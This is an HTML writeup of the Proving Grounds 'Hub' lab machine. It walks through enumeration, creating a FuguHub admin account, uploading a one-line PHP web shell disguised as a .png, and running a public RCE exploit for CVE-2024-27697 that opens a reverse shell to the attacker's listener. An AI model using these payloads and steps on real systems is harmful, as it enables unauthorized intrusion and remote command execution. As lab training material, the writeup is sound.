@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="description" content="Proving Grounds Hub Writeup - Rachel Murphy" />
+  <title>PG: Hub | Rachel Murphy</title>
+
+  <link rel="stylesheet" href="/assets/css/writeups.css">
+  <style>
+    img.screenshot {
+      max-width: 100%;
+      margin: 0.75rem 0;
+      border: 2px solid #39ff14;
+      border-radius: 6px;
+      display: block;
+    }
+    pre { background: rgba(15,23,36,0.9); padding: 1rem; border-radius: 6px; overflow-x: auto; }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="wrap">
+      <h1>Hub — Writeup</h1>
+      <p class="meta">Proving Grounds — Linux / Web Application Exploitation</p>
+      <nav>
+        <ul class="main-nav">
+          <li><a href="/index.html">Home</a></li>
+          <li><a href="/writeups/index.html">Writeups</a></li>
+          <li><a href="/cheatsheets/cheatsheet.html">Cheatsheets</a></li>
+          <li><a href="/tools/index.html">Tools</a></li>
+          <li><a href="/about.html">About</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main class="wrap">
+
+    <!-- Machine Summary -->
+    <section class="machine-summary">
+      <h2>Machine Overview</h2>
+      <p><strong>Difficulty:</strong> Intermediate</p>
+      <p><strong>Platform:</strong> Offensive Security Proving Grounds (Practice)</p>
+      <p><strong>Description:</strong> Hub is a Linux VM that runs multiple web servers, including a vulnerable FuguHub 8.4 instance on port 8082. The objective is to create an admin account, exploit an authenticated RCE vulnerability to gain a user shell, and then escalate to root.</p>
+    </section>
+
+    <!-- Enumeration -->
+    <section class="enumeration">
+      <h2>Enumeration</h2>
+      <p>Initial Nmap scan:</p>
+      <pre><code>sudo nmap -sC -sV 192.168.236.25 -oN nmap-hub</code></pre>
+      <img class="screenshot" src="../images/Pasted image 20250711131636.png" alt="Nmap scan - three web servers">
+
+      <p>Port 80 (nginx/1.18.0) enumeration:</p>
+      <img class="screenshot" src="../images/Pasted image 20250711131735.png" alt="Port 80 - nginx">
+
+      <h3>Directory discovery with Ferox</h3>
+      <pre><code>feroxbuster -u http://192.168.236.25 -w /usr/share/wordlists/dirb/big.txt</code></pre>
+
+      <p>Port 9999 - SSL / Ferox failed:</p>
+      <pre><code>feroxbuster -u http://192.168.236.25:9999 -w /usr/share/wordlists/dirb/big.txt -k -o ferox9999</code></pre>
+
+      <p>Port 8082 - FuguHub web interface:</p>
+      <pre><code>feroxbuster -u http://192.168.236.25:8082 -w /usr/share/wordlists/dirb/big.txt -o ferox8082</code></pre>
+      <img class="screenshot" src="../images/Pasted image 20250711132353.png" alt="Feroxbuster results 8082">
+    </section>
+
+    <!-- Web Exploitation -->
+    <section class="web-exploitation">
+      <h2>Web Exploitation</h2>
+
+      <p>Create an admin account:</p>
+      <img class="screenshot" src="../images/Pasted image 20250711132529.png" alt="Register admin account">
+      <p>Adjust password to meet policy:</p>
+      <img class="screenshot" src="../images/Pasted image 20250711132639.png" alt="Password set successfully">
+
+      <p>Navigate to admin panel:</p>
+      <img class="screenshot" src="../images/Pasted image 20250711132859.png" alt="Admin panel">
+      <img class="screenshot" src="../images/Pasted image 20250711133018.png" alt="Admin panel options">
+
+      <p>Feroxbuster requests logged:</p>
+      <img class="screenshot" src="../images/Pasted image 20250711133135.png" alt="Ferox requests">
+
+      <h3>Uploading Web Shell</h3>
+      <p>Attempting to upload PHP reverse shell disguised as a .png file:</p>
+      <img class="screenshot" src="../images/Pasted image 20250711133455.png" alt="Upload images directory">
+      <img class="screenshot" src="../images/Pasted image 20250711133619.png" alt="Saved location for webshell">
+
+      <pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+      <img class="screenshot" src="../images/Pasted image 20250711133733.png" alt="PHP reverse shell code">
+      <img class="screenshot" src="../images/Pasted image 20250711133832.png" alt="Webshell upload successful">
+
+      <p>Attempt to access uploaded web shell:</p>
+      <img class="screenshot" src="../images/Pasted image 20250711134012.png" alt="Web shell access attempt">
+    </section>
+
+    <!-- Exploit -->
+    <section class="exploit">
+      <h2>Authenticated RCE Exploit</h2>
+      <p>FuguHub 8.4 Authenticated RCE (CVE-2024-27697) via LUA code injection:</p>
+      <img class="screenshot" src="../images/Pasted image 20250711134353.png" alt="FuguHub exploit found">
+      <img class="screenshot" src="../images/Pasted image 20250711134526.png" alt="Modified exploit code">
+
+      <pre><code>python3 exploit.py -r 192.168.236.25 -rp 8082 -l 192.168.45.152 -p 9001</code></pre>
+      <img class="screenshot" src="../images/Pasted image 20250711135127.png" alt="Exploit executed - got foothold">
+      <img class="screenshot" src="../images/Pasted image 20250711135201.png" alt="Reverse shell connection">
+    </section>
+
+    <!-- User Shell -->
+    <section class="user-shell">
+      <h2>User Shell Access</h2>
+      <p>Spawn TTY shell:</p>
+      <pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+      <img class="screenshot" src="../images/Pasted image 20250711135402.png" alt="Spawn TTY shell">
+
+      <h3>Enumeration</h3>
+      <pre><code>whoami</code></pre>
+      <img class="screenshot" src="../images/Pasted image 20250711135531.png" alt="Identify user">
+    </section>
+
+    <!-- Privilege Escalation -->
+    <section class="privilege-escalation">
+      <h2>Privilege Escalation</h2>
+      <p>Further enumeration would follow typical Linux privesc methods to escalate from this user to root.</p>
+    </section>
+
+    <!-- Summary -->
+    <section class="summary">
+      <h2>Box Summary</h2>
+      <p>The Hub VM teaches:</p>
+      <ul>
+        <li>Enumeration of multiple web servers.</li>
+        <li>Admin account creation and password policy handling.</li>
+        <li>Authenticated RCE exploitation using public exploits (FuguHub 8.4).</li>
+        <li>Uploading and executing reverse shells to gain a user shell.</li>
+        <li>Basic Linux enumeration for privilege escalation preparation.</li>
+      </ul>
+    </section>
+
+  </main>
+</body>
+</html>
